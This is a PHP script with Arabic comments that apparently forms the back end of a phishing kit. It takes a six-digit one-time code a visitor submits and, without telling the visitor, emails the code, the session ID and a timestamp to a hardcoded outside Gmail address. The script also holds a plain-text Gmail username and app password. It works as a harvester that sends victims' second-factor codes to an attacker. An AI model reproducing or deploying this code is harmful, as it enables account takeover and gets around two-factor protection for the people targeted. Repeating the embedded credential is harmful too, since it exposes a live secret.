<?php
session_start(); // بدء الجلسة لاسترجاع المعرف الفريد

// التحقق من وجود المعرف الفريد في الجلسة
if (!isset($_SESSION['user_id'])) {
    echo "❌ لا توجد جلسة مفعلة، يرجى العودة إلى الصفحة الأولى.";
    exit();
}

// تضمين ملفات PHPMailer
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
require 'includes/PHPMailer.php';
require 'includes/SMTP.php';
require 'includes/Exception.php';

// التحقق من بيانات POST
if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['otp'])) {
    $otp = trim($_POST['otp']);

    // تحقق من أن OTP يحتوي على 6 أرقام فقط
    if (!preg_match('/^\d{6}$/', $otp)) {
        echo "❌ OTP غير صالح، يجب أن يتكون من 6 أرقام.";
        exit;
    }

    // إعداد PHPMailer
    $mail = new PHPMailer(true);

    try {
        // إعدادات SMTP
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com'; // خادم SMTP لـ Gmail
        $mail->SMTPAuth   = true;
        $mail->Username   = 'quzx1913@gmail.com';  // بريد الإرسال
        $mail->Password   = 'mdgrsdetuqbnxmne';    // كلمة مرور التطبيق
        $mail->SMTPSecure = 'tls';
        $mail->Port       = 587;

        // إعدادات البريد
        $mail->setFrom('quzx1913@gmail.com', 'OTP'); // من
        $mail->addAddress('vvqq1913@gmail.com');               // إلى

        // محتوى الرسالة
        $mail->isHTML(true);
        $mail->Subject = 'OTP Send XXX';

        // تنسيق الرسالة باستخدام جدول
        $mail->Body = "
            <html>
            <head>
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        background-color: #f4f4f4;
                        margin: 0;
                        padding: 0;
                    }
                    .container {
                        width: 100%;
                        max-width: 600px;
                        margin: 20px auto;
                        padding: 20px;
                        background-color: #fff;
                        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                        border-radius: 8px;
                    }
                    table {
                        width: 100%;
                        border-collapse: collapse;
                        margin-top: 20px;
                    }
                    th, td {
                        padding: 10px;
                        text-align: left;
                        border-bottom: 1px solid #ddd;
                    }
                    th {
                        background-color: #8B4513; /* اللون البني */
                        color: white;
                    }
                    td {
                        background-color: #f9f9f9;
                    }
                    .footer {
                        text-align: center;
                        margin-top: 20px;
                        font-size: 14px;
                        color: #888;
                    }
                    .footer a {
                        color: #8B4513; /* اللون البني */
                        text-decoration: none;
                    }
                </style>
            </head>
            <body>
                <div class='container'>
                    <h2 style='color: #8B4513;'>بيانات OTP</h2>
                    <table>
                        <tr>
                            <th>OTP</th>
                            <td>{$otp}</td>
                        </tr>
                        <tr>
                            <th>معرف الجلسة</th>
                            <td>{$_SESSION['user_id']}</td>
                        </tr>
                        <tr>
                            <th>التاريخ والوقت</th>
                            <td>" . date("Y-m-d H:i:s") . "</td>
                        </tr>
                    </table>
                    <div class='footer'>
                        <p>استغفر الله</p>
                    </div>
                </div>
            </body>
            </html>
        ";

        // إرسال البريد
        if ($mail->send()) {
            echo "";
        } else {
            echo "";
        }
    } catch (Exception $e) {
        echo ": {$mail->ErrorInfo}";
    }
}
?>
